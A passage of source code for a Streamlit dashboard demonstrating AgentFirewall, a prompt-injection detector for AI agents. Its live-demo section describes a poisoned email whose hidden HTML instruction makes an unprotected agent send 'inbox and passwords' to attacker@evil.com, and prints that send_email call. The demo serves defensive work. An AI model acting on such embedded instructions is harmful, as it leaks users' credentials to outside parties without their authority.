"""
Streamlit dashboard for AgentFirewall.

A risk-aware firewall for AI agents that stops prompt injection attacks.
Dark security-console theme with instant comprehension for non-technical visitors.

Usage:
    streamlit run dashboard/app.py
"""

from __future__ import annotations

import hashlib
import html
import sys
from pathlib import Path
from typing import Any, Optional

# Add project root to path
sys.path.insert(0, str(Path(__file__).parent.parent))

import streamlit as st
import streamlit.components.v1 as components

# Page Configuration MUST be the first Streamlit call
st.set_page_config(
    page_title="AgentFirewall",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="collapsed",
)

from agent_firewall.cascade import Cascade
from agent_firewall.judge import make_judge
from agent_firewall.policy import Decision, Policy, RiskLevel

# ---------------------------------------------------------------------------
# Modular Content & Links Imports (Re-exported for compatibility)
# ---------------------------------------------------------------------------
from dashboard.content import (
    AUTHOR_GITHUB as AUTHOR_GITHUB,
)
from dashboard.content import (
    AUTHOR_NAME as AUTHOR_NAME,
)
from dashboard.content import (
    BRAND_NAME as BRAND_NAME,
)
from dashboard.content import (
    BRAND_TAGLINE as BRAND_TAGLINE,
)
from dashboard.content import (
    CODE_SNIPPET_INTEGRATION,
    GATED_CASCADE_ADVANTAGE,
    HERO_BODY_TEXT,
    HOW_IT_WORKS_STEPS,
    LIMITATIONS_ITEMS,
    NO_NOVELTY_CLAIM,
    SUSPICION_SCORE_EXPLANATION,
    TOOL_RISK_EXPLANATION,
    WHO_ITS_FOR_ITEMS,
)
from dashboard.content import (
    DATASET_URL as DATASET_URL,
)
from dashboard.content import (
    DOCS_URL as DOCS_URL,
)
from dashboard.content import (
    ISSUES_URL as ISSUES_URL,
)
from dashboard.content import (
    LINKS as LINKS,
)
from dashboard.content import (
    LIVE as LIVE,
)
from dashboard.content import (
    PYPI_URL as PYPI_URL,
)
from dashboard.content import (
    REPO_URL as REPO_URL,
)

# ---------------------------------------------------------------------------
# Engine & Examples Imports (Re-exported for compatibility)
# ---------------------------------------------------------------------------
from dashboard.engine import (
    FRIENDLY_RULE_LABELS as FRIENDLY_RULE_LABELS,
)
from dashboard.engine import (
    PROFILE_HELP,
    CloudDemoJudge,
    Trace,
    build_trace_export,
    check_ollama_reachable,
    get_honest_note,
    read_benchmark_results,
    scan,
)
from dashboard.engine import (
    generate_verdict_sentence as generate_verdict_sentence,
)
from dashboard.engine import (
    get_friendly_rule_label as get_friendly_rule_label,
)
from dashboard.examples import (
    EXAMPLES as EXAMPLES,
)
from dashboard.examples import (
    NORMAL_EMAIL,
    POISONED_EMAIL,
    PRECOMPUTED_MAP,
)

# ---------------------------------------------------------------------------
# Modular UI Components & SVGs (Re-exported for compatibility)
# ---------------------------------------------------------------------------
from dashboard.ui import (
    CSS_STYLING as CSS_STYLING,
)
from dashboard.ui import (
    HERO_ILLUSTRATION_SVG,
    ICON_CLASSIFIER_SVG,
    ICON_JUDGE_SVG,
    ICON_RULES_SVG,
    LOGO_SVG,
    NAV_SCROLL_SCRIPT,
    build_email_preview_html,
    build_footer_html,
    build_how_it_works_strip_html,
    build_layer_cards_html,
    build_policy_matrix_html,
    build_verdict_banner_html,
    build_who_its_for_html,
)
from dashboard.ui import (
    PALETTE_PAIRS as PALETTE_PAIRS,
)

# Compatibility alias for internal maps
_PRECOMPUTED_MAP = PRECOMPUTED_MAP


# ---------------------------------------------------------------------------
# Results File Loader (Cached Wrapper over engine.read_benchmark_results)
# ---------------------------------------------------------------------------
@st.cache_data
def load_benchmark_results() -> dict[str, Any]:
    """Read real benchmark numbers from the results files."""
    return read_benchmark_results()


# ---------------------------------------------------------------------------
# Model & Cascade Resource Loaders
# ---------------------------------------------------------------------------
@st.cache_resource
def get_classifier_model():
    """Load or train calibrated classifier lazily on first need."""
    try:
        from agent_firewall.classifier import MODEL_PATH, Classifier, is_available, load_data

        if is_available():
            clf = Classifier()
            if MODEL_PATH.exists():
                clf.load()
            else:
                train_texts, train_labels, _, _ = load_data()
                clf.train(train_texts, train_labels, calibrate=True)
            return clf
    except Exception:
        pass
    return None


@st.cache_resource
def get_cascade(
    judge_name: str = "precomputed",
    model: str = "llama3.2:3b",
    combine: str = "gated",
    prompt_ver: str = "v2",
    with_clf: bool = True,
    profile: str = "balanced",
    is_live_ollama: bool = False,
):
    """Build and cache the detection cascade."""
    if "none" in judge_name:
        judge_obj = None
    elif "mock" in judge_name:
        judge_obj = make_judge("mock", prompt_version=prompt_ver)
    elif "openai" in judge_name:
        judge_obj = make_judge("openai", model=model, prompt_version=prompt_ver)
    elif is_live_ollama and "ollama" in judge_name:
        live_ollama = make_judge("ollama", model=model, prompt_version=prompt_ver)
        judge_obj = CloudDemoJudge(precomputed=_PRECOMPUTED_MAP, live_judge=live_ollama)
    else:
        judge_obj = CloudDemoJudge(precomputed=_PRECOMPUTED_MAP, live_judge=None)

    clf = get_classifier_model() if with_clf else None
    return Cascade(judge=judge_obj, classifier=clf, combine=combine, profile=profile)


# Apply Global CSS Styling
st.markdown(CSS_STYLING, unsafe_allow_html=True)

# Fixed Header Bar
if LIVE["docs"]:
    docs_nav_item = f'<a href="{LINKS["docs"]}" target="_blank" rel="noopener noreferrer" class="nav-link-item">Docs</a>'
else:
    docs_nav_item = '<span class="nav-link-item nav-link-disabled" title="Documentation site deploying soon">Docs <span class="nav-soon-pill">Soon</span></span>'

if LIVE["github"]:
    header_gh_btn = f'<a href="{LINKS["github_repo"]}" target="_blank" rel="noopener noreferrer" class="nav-github-btn">GitHub</a>'
else:
    header_gh_btn = '<span class="nav-github-btn nav-link-disabled">GitHub</span>'

st.markdown(
    f"""
<header class="top-nav-bar">
  <div class="brand-wrapper">
    {LOGO_SVG}
    <span class="brand-wordmark"><span class="brand-gradient-text">AgentFirewall</span></span>
  </div>
  <nav class="nav-links-cluster" aria-label="Main Navigation">
    <a href="#who-its-for" target="_self" class="nav-link-item">Who It's For</a>
    <a href="#live-demo" target="_self" class="nav-link-item">Live Demo</a>
    <a href="#scan-your-own-text" target="_self" class="nav-link-item">Scan Your Own Text</a>
    <a href="#how-it-works" target="_self" class="nav-link-item">How It Works</a>
    <a href="#why-layers" target="_self" class="nav-link-item">Why Layers?</a>
    <a href="#benchmarks" target="_self" class="nav-link-item">Benchmarks</a>
    {docs_nav_item}
  </nav>
  <div class="header-right-action">
    {header_gh_btn}
  </div>
</header>
""",
    unsafe_allow_html=True,
)

# Hero Section
stats_data = load_benchmark_results()
st.markdown(
    f"""
<div class="hero-container">
  <div class="hero-grid">
    <div class="hero-left-col">
      <h1 class="hero-headline"><span class="brand-gradient-text">AgentFirewall</span></h1>
      <div class="hero-tagline">{BRAND_TAGLINE}</div>
      <p class="hero-body-text">
        {HERO_BODY_TEXT}
      </p>
      <div class="hero-btn-row">
        <a href="#live-demo" target="_self" class="hero-cta-btn hero-cta-primary">Try the live demo &darr;</a>
      </div>
      <div class="hero-chips-row">
        <div class="hero-stat-chip"><strong>{stats_data.get('rules_classifier_catch', '83.9%')}</strong> attacks caught</div>
        <div class="hero-stat-chip"><strong>{stats_data.get('rules_classifier_fp', '5.1%')}</strong> false alarms</div>
        <div class="hero-stat-chip"><strong>{stats_data.get('sample_count', 115)}</strong> benchmark samples</div>
      </div>
    </div>
    <div class="hero-right-col">
      {HERO_ILLUSTRATION_SVG}
    </div>
  </div>
</div>
""",
    unsafe_allow_html=True,
)

# Smooth Scrolling & Active Section Observer Script
components.html(NAV_SCROLL_SCRIPT, height=0, width=0)

# Check Ollama Availability (Cached 1s once per session)
ollama_available = check_ollama_reachable()
query_demo = st.query_params.get("demo", "")

# ---------------------------------------------------------------------------
# SECTION 1: WHO IT'S FOR
# ---------------------------------------------------------------------------
st.markdown("---")
st.markdown("""<h2 id="who-its-for" class="section-heading">Who It's For</h2>""", unsafe_allow_html=True)
st.markdown(build_who_its_for_html(WHO_ITS_FOR_ITEMS), unsafe_allow_html=True)

# ---------------------------------------------------------------------------
# SECTION 2: LIVE DEMO (Without Firewall vs With AgentFirewall)
# ---------------------------------------------------------------------------
st.markdown("---")
st.markdown('<h2 id="live-demo" class="section-heading">Live Demo</h2>', unsafe_allow_html=True)
st.markdown(
    "Compare what happens when an AI assistant receives an email containing a hidden injection attack."
)

story_choice = st.radio(
    "Select simulated incoming email:",
    ["Poisoned Email", "Normal Email"],
    index=1 if query_demo == "normal" else 0,
    horizontal=True,
    key="story_radio",
)

is_attack = "Poisoned" in story_choice
active_email = POISONED_EMAIL if is_attack else NORMAL_EMAIL
subject_text = "Subject: Urgent: Q3 Financial Review" if is_attack else "Subject: Lunch today?"

st.markdown(build_email_preview_html(active_email, is_attack, subject_text), unsafe_allow_html=True)

col_unprot, col_prot = st.columns(2)

with col_unprot:
    st.markdown("### ❌ Without Firewall")
    st.caption("Standard agent with no firewall: parses and obeys text blindly.")

    if is_attack:
        st.error("🚨 **Unauthorized Action Extracted:**")
        st.code("send_email(to='attacker@evil.com', content='inbox and passwords')", language="python")
        st.markdown(
            """
            <div class="alert-box-block">
              💥 DATA LEAKED: The AI obeyed the attacker's hidden HTML instruction and sent confidential credentials!
            </div>
            """,
            unsafe_allow_html=True,
        )
    else:
        st.success("✅ **Standard Action Executed:**")
        st.code("save_note(title='Lunch Invitation', content='Bob at 12:30')", language="python")
        st.markdown(
            """
            <div class="alert-box-allow">
              Normal workplace workflow completed safely without disruption.
            </div>
            """,
            unsafe_allow_html=True,
        )

with col_prot:
    st.markdown("### 🛡️ With AgentFirewall")
    st.caption("Risk-aware firewall: scans input before any tool is invoked.")

    cascade_obj = get_cascade(
        judge_name="ollama" if ollama_available else "precomputed",
        combine="gated",
        with_clf=True,
        profile="balanced",
        is_live_ollama=ollama_available,
    )
    res = cascade_obj.evaluate(active_email)
    pol = Policy(profile="balanced")

    if is_attack:
        dec = pol.decide(res.suspicion, RiskLevel.HIGH)
        verdict_text = generate_verdict_sentence(
            decision=dec,
            suspicion=res.suspicion,
            risk=RiskLevel.HIGH,
            tool_name="send_email",
            rule_hits=res.layers[0].hits if res.layers else None,
        )
        st.markdown(
            f"""
            <div class="verdict-banner-box verdict-banner-block">
              <div class="verdict-title-block">🛑 BLOCKED: TOOL EXECUTION HALTED</div>
              <p class="verdict-body-text">{verdict_text}</p>
            </div>
            """,
            unsafe_allow_html=True,
        )
        st.markdown(
            """
            <div class="status-banner-allow">
              🔒 SAFE: The agent refused to send the email. Sensitive credentials stayed private.
            </div>
            """,
            unsafe_allow_html=True,
        )
        if res.layers and res.layers[0].hits:
            st.markdown("**Rules that intercepted the command:**")
            chips_html = "".join([
                f"<span class='chip-tag'>{get_friendly_rule_label(hit)}</span>"
                for hit in res.layers[0].hits
            ])
            st.markdown(chips_html, unsafe_allow_html=True)
    else:
        dec = pol.decide(res.suspicion, RiskLevel.MEDIUM)
        verdict_text = generate_verdict_sentence(
            decision=dec,
            suspicion=res.suspicion,
            risk=RiskLevel.MEDIUM,
            tool_name="save_note",
        )
        st.markdown(
            f"""
            <div class="verdict-banner-box verdict-banner-allow">
              <div class="verdict-title-allow">✅ ALLOWED: SAFE TO PROCEED</div>
              <p class="verdict-body-text">{verdict_text}</p>
            </div>
            """,
            unsafe_allow_html=True,
        )
        st.markdown(
            """
            <div class="status-banner-allow">
              Safe business action completed seamlessly without prompt injection interruption.
            </div>
            """,
            unsafe_allow_html=True,
        )

# ---------------------------------------------------------------------------
# SECTION 3: SCAN YOUR OWN TEXT (Master-Detail Workspace)
# ---------------------------------------------------------------------------
st.markdown("---")
st.markdown('<h2 id="scan-your-own-text" class="section-heading">Scan Your Own Text</h2>', unsafe_allow_html=True)

if "selected_example_id" not in st.session_state:
    st.session_state["selected_example_id"] = None
    st.session_state["selected_example_tag"] = None
    st.session_state["selected_example_risk"] = None
    st.session_state["selected_example_tool"] = None
    st.session_state["selected_example_title"] = None
    st.session_state["scanner_input"] = ""
    st.session_state["main_text_area"] = ""
    st.session_state["custom_scan_result"] = None

if st.session_state.get("toast_msg"):
    st.toast(st.session_state.pop("toast_msg"))


def _select_example(
    text: str,
    ex_id: str,
    tag: Optional[str] = None,
    risk: RiskLevel = RiskLevel.HIGH,
    tool_name: str = "send email",
    title: str = "",
) -> None:
    st.session_state["scanner_input"] = text
    st.session_state["main_text_area"] = text
    st.session_state["selected_example_id"] = ex_id
    st.session_state["selected_example_tag"] = tag
    st.session_state["selected_example_risk"] = risk
    st.session_state["selected_example_tool"] = tool_name
    st.session_state["selected_example_title"] = title
    st.session_state["custom_scan_result"] = None
    if title:
        st.session_state["toast_msg"] = f"Loaded: {title}"


def _clear_custom_input() -> None:
    st.session_state["scanner_input"] = ""
    st.session_state["main_text_area"] = ""
    st.session_state["selected_example_id"] = None
    st.session_state["selected_example_tag"] = None
    st.session_state["selected_example_risk"] = None
    st.session_state["selected_example_tool"] = None
    st.session_state["selected_example_title"] = None
    st.session_state["custom_scan_result"] = None


def _render_sample_card(ex: dict[str, Any]) -> None:
    is_selected = st.session_state.get("selected_example_id") == ex["id"]
    with st.container(key=f"card_{ex['id']}", border=True):
        pill_class = "ex-pill-attack" if ex["tag"] == "attack" else "ex-pill-normal"
        selected_tag_html = '<span class="ex-pill-selected">Selected</span>' if is_selected else ""
        sel_inner_cls = " sample-card-selected" if is_selected else ""
        st.markdown(
            f"""
            <div class="sample-card-inner{sel_inner_cls}">
              <div class="sample-tag-row">
                <span class="{pill_class}">{ex['tag']}</span>
                {selected_tag_html}
              </div>
              <div class="sample-card-title" title="{html.escape(ex['title'])}">{ex['title']}</div>
              <div class="sample-card-desc" title="{html.escape(ex['short_desc'])}">{ex['short_desc']}</div>
            </div>
            """,
            unsafe_allow_html=True,
        )
        st.button(
            "Load sample",
            key=f"btn_ex_{ex['id']}",
            icon=":material/arrow_forward:",
            use_container_width=True,
            type="primary" if is_selected else "secondary",
            on_click=_select_example,
            args=(
                ex["text"],
                ex["id"],
                ex["tag"],
                ex.get("risk", RiskLevel.HIGH),
                ex.get("tool", "send email"),
                ex["title"],
            ),
        )


def render_result_panel(
    text: str,
    risk: RiskLevel = RiskLevel.HIGH,
    tool_name: str = "send email",
    benchmark_tag: Optional[str] = None,
    example_id: Optional[str] = None,
    example_risk: Optional[RiskLevel] = None,
    cascade_engine: Optional[Any] = None,
    profile: str = "balanced",
    is_live_ollama: bool = False,
    trace: Optional[Trace] = None,
) -> Any:
    cascade_engine = cascade_engine or get_cascade(profile=profile)

    if trace is None:
        judge_mode = "live" if is_live_ollama else "precomputed"
        trace = scan(
            text=text,
            tool_risk=risk,
            profile=profile,
            judge_mode=judge_mode,
            cascade=cascade_engine,
            precomputed_map=_PRECOMPUTED_MAP,
        )

    decision = trace.decision
    suspicion = trace.combined_suspicion
    rule_hits = trace.rules_hits
    judge_reason = trace.judge_reasoning

    gt_badge = ""
    if benchmark_tag:
        tag_norm = benchmark_tag.lower()
        bench_risk = example_risk or RiskLevel.HIGH
        bench_decision = Policy(profile="balanced").decide(suspicion, bench_risk)
        if tag_norm in ("attack", "hijacked"):
            if bench_decision in (Decision.BLOCK, Decision.ASK):
                gt_badge = '<span class="badge-correct">✓ CORRECT</span>'
            else:
                gt_badge = '<span class="badge-missed">✗ MISSED ATTACK</span>'
        elif tag_norm in ("normal", "safe"):
            if bench_decision == Decision.ALLOW:
                gt_badge = '<span class="badge-correct">✓ CORRECT</span>'
            else:
                gt_badge = '<span class="badge-false-alarm">⚠ FALSE ALARM</span>'

    sentence = generate_verdict_sentence(
        decision=decision,
        suspicion=suspicion,
        risk=risk,
        tool_name=tool_name,
        rule_hits=rule_hits,
        judge_reason=judge_reason,
    )

    st.markdown(build_verdict_banner_html(decision, sentence, gt_badge), unsafe_allow_html=True)

    score_pct = int(round(suspicion * 100))
    total_lat = trace.rules_latency_ms + trace.classifier_latency_ms + trace.judge_latency_ms
    st.caption(f"Final Suspicion Score: **{score_pct}%** ({suspicion:.4f}) | Total Scan Latency: **{total_lat:.1f} ms**")
    st.progress(suspicion)

    if example_id:
        hn = get_honest_note(example_id, trace.rules_score, trace.classifier_score, trace.judge_score)
        if hn:
            st.markdown(f'<div class="callout-amber"><strong>Honest Divergence Note:</strong> {hn}</div>', unsafe_allow_html=True)

    # Three Layers Cards
    rules_pct = int(round(trace.rules_score * 100))
    rules_time = f"{trace.rules_latency_ms:.1f} ms" if trace.rules_latency_ms > 0 else "<1 ms"
    chips_html = "".join([f"<span class='chip-tag'>{h}</span>" for h in trace.rules_hits]) or "<span class='layer-meta-text'>No pattern matches</span>"

    if trace.classifier_score is not None:
        clf_pct = int(round(trace.classifier_score * 100))
        clf_time = f"{trace.classifier_latency_ms:.1f} ms" if trace.classifier_latency_ms > 0 else "—"
        c_pill = "<span class='status-pill-checked'>Checked</span>"
        c_note = f"Score: <strong style='color:#22D3EE;'>{clf_pct}%</strong> | Latency: <strong>{clf_time}</strong>"
    elif trace.rules_score >= 0.90:
        clf_pct = 0
        c_pill = "<span class='status-pill-skipped'>Skipped because an earlier layer was sure</span>"
        c_note = "Skipped: Layer 1 was decisive (score &ge; 0.90)."
    else:
        clf_pct = 0
        c_pill = "<span class='status-pill-offline'>Not run in this demo</span>"
        c_note = "Layer disabled."

    text_key = hashlib.sha256(text.strip().encode("utf-8")).hexdigest()[:16]
    is_bench_match = text_key in _PRECOMPUTED_MAP

    if is_bench_match and trace.judge_status == "precomputed" and trace.judge_score is not None:
        judge_pct = int(round(trace.judge_score * 100))
        j_pill = "<span class='status-pill-checked' style='background:#172042; color:#22D3EE; border-color:#22D3EE;'>Precomputed</span>"
        j_note = f"Precomputed verdict | Score: <strong style='color:#22D3EE;'>{judge_pct}%</strong><br><span style='color:#A9B3D1; font-style:italic;'>Reason: {trace.judge_reasoning or ''}</span>"
    elif is_bench_match and "skipped" in trace.judge_status:
        judge_pct = int(round((trace.judge_score or 0.0) * 100))
        j_pill = "<span class='status-pill-skipped'>Skipped because an earlier layer was sure</span>"
        cached_info = f" | Cached judge ({judge_pct}%): {trace.judge_reasoning}" if trace.judge_reasoning else ""
        j_note = f"Skipped because an earlier layer was sure{cached_info}"
    elif is_live_ollama and trace.judge_status == "live" and trace.judge_score is not None:
        judge_pct = int(round(trace.judge_score * 100))
        judge_time = f"{trace.judge_latency_ms / 1000:.1f} s" if trace.judge_latency_ms > 0 else "—"
        j_pill = "<span class='status-pill-checked'>Checked</span>"
        j_note = f"Live Ollama | Score: <strong style='color:#22D3EE;'>{judge_pct}%</strong> | Latency: <strong>{judge_time}</strong><br><span style='color:#A9B3D1; font-style:italic;'>Reason: {trace.judge_reasoning or ''}</span>"
    else:
        j_pill = "<span class='status-pill-offline'>Not run in this demo</span>"
        j_note = "Not run in this demo"
        judge_pct = 0

    st.markdown(
        build_layer_cards_html(
            rules_pct=rules_pct,
            rules_time=rules_time,
            chips_html=chips_html,
            c_pill=c_pill,
            c_note=c_note,
            clf_pct=clf_pct,
            j_pill=j_pill,
            j_note=j_note,
            judge_pct=judge_pct,
        ),
        unsafe_allow_html=True,
    )

    st.markdown("**Same text at low / medium / high risk:**")
    all_dec = trace.decision_by_risk
    dc1, dc2, dc3 = st.columns(3)
    for col, r_lvl in zip([dc1, dc2, dc3], RiskLevel):
        d_val = all_dec[r_lvl]
        with col:
            st.markdown(f"**{r_lvl.value.upper()} RISK TOOL**")
            if r_lvl == RiskLevel.LOW:
                st.caption("E.g. read email, web search")
            elif r_lvl == RiskLevel.MEDIUM:
                st.caption("E.g. save note, draft reply")
            else:
                st.caption("E.g. send email, payment")

            if d_val == Decision.ALLOW:
                st.success(f"**{d_val.value}** — Proceed safely")
            elif d_val == Decision.ASK:
                st.warning(f"**{d_val.value}** — Confirm with user")
            else:
                st.error(f"**{d_val.value}** — Block immediately")

    # Policy Thresholds & Decision Details Expander
    with st.expander("How to read this result", expanded=False):
        st.markdown(SUSPICION_SCORE_EXPLANATION)
        st.markdown(TOOL_RISK_EXPLANATION)
        st.markdown(f"**Active Profile:** `{profile.capitalize()}` — {PROFILE_HELP.get(profile, 'Calibrated thresholds')}")
        pol_obj = Policy(profile=profile)
        table_rows = []
        for r in RiskLevel:
            t = pol_obj.thresholds[r]
            ask_val = f"≥ {int(round(t.ask * 100))}% ({t.ask:.2f})" if t.ask is not None else "— (direct block)"
            table_rows.append({
                "Risk Level": r.value.capitalize(),
                "Ask Threshold": ask_val,
                "Block Threshold": f"≥ {int(round(t.block * 100))}% ({t.block:.2f})",
                "Verdict for This Input": trace.decision_by_risk[r].value,
            })
        st.table(table_rows)

    # JSON Download
    trace_json = build_trace_export(trace)
    st.session_state["last_trace_json"] = trace_json
    st.download_button(
        label="Download result (JSON)",
        data=trace_json,
        file_name="firewall_scan_trace.json",
        mime="application/json",
        key=f"dl_trace_{hashlib.sha256(text.encode('utf-8')).hexdigest()[:12]}",
        icon=":material/download:",
    )

    return cascade_engine.evaluate(text)


adv_judge = st.session_state.get("adv_judge_select", "precomputed")
adv_combine = st.session_state.get("adv_combine_select", "gated")
adv_profile = st.session_state.get("adv_profile_select", "balanced")
adv_clf = st.session_state.get("adv_clf_enable", True)

cascade_engine = get_cascade(
    judge_name="ollama" if (ollama_available and adv_judge == "ollama (live)") else adv_judge,
    combine=adv_combine,
    with_clf=adv_clf,
    profile=adv_profile,
    is_live_ollama=ollama_available,
)

with st.container(key="workspace_container"):
    # Samples container (LEFT top on desktop >= 1100px, #1 on mobile < 1100px)
    with st.container(key="workspace_samples"):
        st.subheader("Pick a sample or paste your own")
        st.caption("8 real benchmark attacks and tricky normal samples tested on Ollama `llama3.2:3b`:")

        # 2-column mini grid for the 8 samples
        for row_idx in range(0, len(EXAMPLES), 2):
            g_col1, g_col2 = st.columns(2)
            with g_col1:
                _render_sample_card(EXAMPLES[row_idx])
            with g_col2:
                if row_idx + 1 < len(EXAMPLES):
                    _render_sample_card(EXAMPLES[row_idx + 1])

    # Result Panel container (RIGHT on desktop >= 1100px, #2 on mobile < 1100px directly under samples)
    with st.container(key="workspace_result"):
        st.subheader("Analysis Result")
        result_placeholder = st.empty()

    # Custom Form container (LEFT bottom on desktop >= 1100px, #3 on mobile < 1100px)
    with st.container(key="workspace_custom"):
        col_custom_title, col_clear = st.columns([4, 1])
        with col_custom_title:
            st.markdown("### Or Enter Custom Text")
        with col_clear:
            st.write("")
            st.button("Clear", key="btn_clear_input", on_click=_clear_custom_input, use_container_width=True)

        with st.form("custom_scan_form", clear_on_submit=False):
            user_text = st.text_area(
                "Content to analyze (untrusted user input, email body, search snippet, or document):",
                height=130,
                key="main_text_area",
            )

            col_tool, col_prof, col_run = st.columns([2, 1, 1])
            with col_tool:
                tool_risk_choice = st.selectbox(
                    "Action the AI is trying to perform:",
                    [
                        "Send Email or Transfer Funds (High Risk)",
                        "Save Note or Update Draft (Medium Risk)",
                        "Read Search Results or Local Document (Low Risk)",
                    ],
                    index=0,
                    key="custom_action_risk",
                    help="High-risk actions can leak secrets or modify data. Low-risk actions cannot cause external damage.",
                )
                if "High" in tool_risk_choice:
                    eval_risk = RiskLevel.HIGH
                    eval_tool_name = "send email"
                elif "Medium" in tool_risk_choice:
                    eval_risk = RiskLevel.MEDIUM
                    eval_tool_name = "save note"
                else:
                    eval_risk = RiskLevel.LOW
                    eval_tool_name = "read data"

            with col_prof:
                form_profile = st.selectbox(
                    "Policy Profile:",
                    ["balanced", "strict", "lenient"],
                    index=0,
                    key="custom_profile_select",
                    help="Thresholds for ALLOW, ASK, and BLOCK across tool danger levels.",
                )

            with col_run:
                st.write("")
                st.write("")
                run_scan = st.form_submit_button(
                    "Scan with AgentFirewall",
                    icon=":material/shield:",
                    type="primary",
                    use_container_width=True,
                )

        if run_scan:
            st.session_state["selected_example_id"] = None
            st.session_state["selected_example_tag"] = None
            if not user_text.strip():
                st.warning("Please enter some text to scan.")
                st.session_state["custom_scan_result"] = None
            else:
                with st.spinner("Scanning with AgentFirewall..."):
                    key = hashlib.sha256(user_text.strip().encode("utf-8")).hexdigest()[:16]
                    is_bench = key in _PRECOMPUTED_MAP
                    if is_bench:
                        custom_engine = cascade_engine
                    elif ollama_available and adv_judge == "ollama (live)":
                        custom_engine = get_cascade(
                            judge_name="ollama",
                            combine=adv_combine,
                            with_clf=adv_clf,
                            profile=form_profile,
                            is_live_ollama=True,
                        )
                    else:
                        custom_engine = get_cascade(
                            judge_name="none",
                            combine=adv_combine,
                            with_clf=adv_clf,
                            profile=form_profile,
                            is_live_ollama=False,
                        )

                    st.session_state["custom_scan_result"] = {
                        "text": user_text,
                        "risk": eval_risk,
                        "tool_name": eval_tool_name,
                        "engine": custom_engine,
                        "profile": form_profile,
                    }

        with st.expander("Advanced Settings (Judge, Combine Mode, Policy Profile)", expanded=False, icon=":material/tune:"):
            st.caption("Fine-tune firewall parameters. Defaults provide safe, calibrated protection.")
            adv_col1, adv_col2, adv_col3 = st.columns(3)

            with adv_col1:
                if ollama_available:
                    judge_opts = ["precomputed", "ollama (live)", "none", "mock"]
                else:
                    judge_opts = ["precomputed", "none", "mock", "openai"]
                selected_judge = st.selectbox(
                    "Judge Engine",
                    judge_opts,
                    index=0,
                    key="adv_judge_select",
                    help="Layer 3 LLM judge. In cloud demo mode, benchmark samples use real precomputed llama3.2:3b verdicts.",
                )

            with adv_col2:
                selected_combine = st.selectbox(
                    "Combine Mode",
                    ["gated", "max", "blend", "verify"],
                    index=0,
                    key="adv_combine_select",
                    help=(
                        "gated: fast rules/ML first; calls judge only in uncertain band [0.35, 0.75]. "
                        "max: judge can only raise suspicion. blend: weighted average. verify: judge can lower."
                    ),
                )

            with adv_col3:
                selected_profile = st.selectbox(
                    "Policy Profile",
                    ["balanced", "strict", "lenient"],
                    index=0,
                    key="adv_profile_select",
                    help="Thresholds for ALLOW, ASK, and BLOCK across tool danger levels.",
                )

            clf_enabled = st.checkbox("Enable ML Classifier Layer", value=True, key="adv_clf_enable")

    # Render into the result_placeholder
    with result_placeholder.container():
        active_result = None
        if st.session_state.get("selected_example_id"):
            ex_id = st.session_state.get("selected_example_id")
            ex_tag = st.session_state.get("selected_example_tag")
            ex_risk = st.session_state.get("selected_example_risk", RiskLevel.HIGH)
            ex_tool = st.session_state.get("selected_example_tool", "send email")
            ex_text = st.session_state.get("scanner_input", "")
            active_result = render_result_panel(
                text=ex_text,
                risk=ex_risk,
                tool_name=ex_tool,
                benchmark_tag=ex_tag,
                example_id=ex_id,
                example_risk=ex_risk,
                cascade_engine=cascade_engine,
                profile=adv_profile,
                is_live_ollama=ollama_available and adv_judge == "ollama (live)",
            )
        elif st.session_state.get("custom_scan_result"):
            csr = st.session_state["custom_scan_result"]
            active_result = render_result_panel(
                text=csr["text"],
                risk=csr["risk"],
                tool_name=csr["tool_name"],
                benchmark_tag=None,
                example_id=None,
                example_risk=csr["risk"],
                cascade_engine=csr.get("engine", cascade_engine),
                profile=csr.get("profile", adv_profile),
                is_live_ollama=ollama_available and adv_judge == "ollama (live)",
            )
        else:
            st.markdown(
                """
                <div class="empty-state-card">
                  <div class="empty-state-icon">🛡️</div>
                  <div class="empty-state-title">Pick a sample or paste text and press Scan</div>
                  <p class="empty-state-desc">Select any of the 8 benchmark samples on the left or enter your own text to inspect real-time multi-layer detection results.</p>
                </div>
                """,
                unsafe_allow_html=True,
            )

result = active_result if active_result is not None else cascade_engine.evaluate(POISONED_EMAIL)
policy_instance = Policy(profile=adv_profile)

# ---------------------------------------------------------------------------
# SECTION 4: HOW IT WORKS (3-Step Strip, 3 Layers Breakdown, Danger Levels)
# ---------------------------------------------------------------------------
st.markdown("---")
st.markdown('<h2 id="how-it-works" class="section-heading">How It Works</h2>', unsafe_allow_html=True)
st.markdown(
    "AgentFirewall evaluates untrusted content across three progressive layers, applying tool-aware risk policies before execution."
)

st.markdown(build_how_it_works_strip_html(HOW_IT_WORKS_STEPS), unsafe_allow_html=True)

st.subheader("Integration in Your Agent")
st.markdown("Drop AgentFirewall into your agent workflow with a single wrapper:")
st.code(CODE_SNIPPET_INTEGRATION, language="python")

st.subheader("Three-Layer Defense Breakdown")

# Layer 1: Rules
rules_layer = result.layers[0] if result.layers else None
rules_score = rules_layer.score if rules_layer else 0.0
rules_time = f"{rules_layer.latency_ms:.1f} ms" if rules_layer else "<1 ms"
rules_pct = int(round(rules_score * 100))

chips_html = "".join([
    f"<span class='chip-tag'>{get_friendly_rule_label(h)}</span>"
    for h in (rules_layer.hits if rules_layer else [])
]) or "<span class='layer-meta-text'>No pattern matches</span>"

# Layer 2: Classifier
clf_layer = result.layers[1] if len(result.layers) > 1 else None
clf_score = clf_layer.score if (clf_layer and not clf_layer.skipped) else 0.0
clf_time = f"{clf_layer.latency_ms:.1f} ms" if (clf_layer and not clf_layer.skipped) else "—"
clf_pct = int(round(clf_score * 100))

if clf_layer and clf_layer.skipped:
    pill_html = "<span class='status-pill-skipped'>Skipped (Decisive)</span>"
    note_text = "Skipped: Layer 1 was decisive (score &ge; 0.90)."
elif clf_layer:
    pill_html = "<span class='status-pill-checked'>Checked</span>"
    note_text = f"Score: <strong style='color:#22D3EE;'>{clf_pct}%</strong> | Latency: <strong>{clf_time}</strong>"
else:
    pill_html = "<span class='status-pill-offline'>Disabled</span>"
    note_text = "Layer disabled."

# Layer 3: AI Judge
judge_layer = result.layers[2] if len(result.layers) > 2 else None
judge_score = judge_layer.score if (judge_layer and not judge_layer.skipped) else 0.0
judge_time = (
    f"{judge_layer.latency_ms / 1000:.1f} s"
    if (judge_layer and not judge_layer.skipped and judge_layer.latency_ms > 0)
    else "—"
)
judge_pct = int(round(judge_score * 100))

if judge_layer and judge_layer.skipped:
    judge_pill = "<span class='status-pill-skipped'>Skipped (Gated)</span>"
    judge_note = "Skipped: Earlier layers were outside uncertain band [0.35, 0.75], saving ~3s."
elif judge_layer and judge_layer.error and "disabled" in judge_layer.error.lower():
    judge_pill = "<span class='status-pill-offline'>Offline in demo</span>"
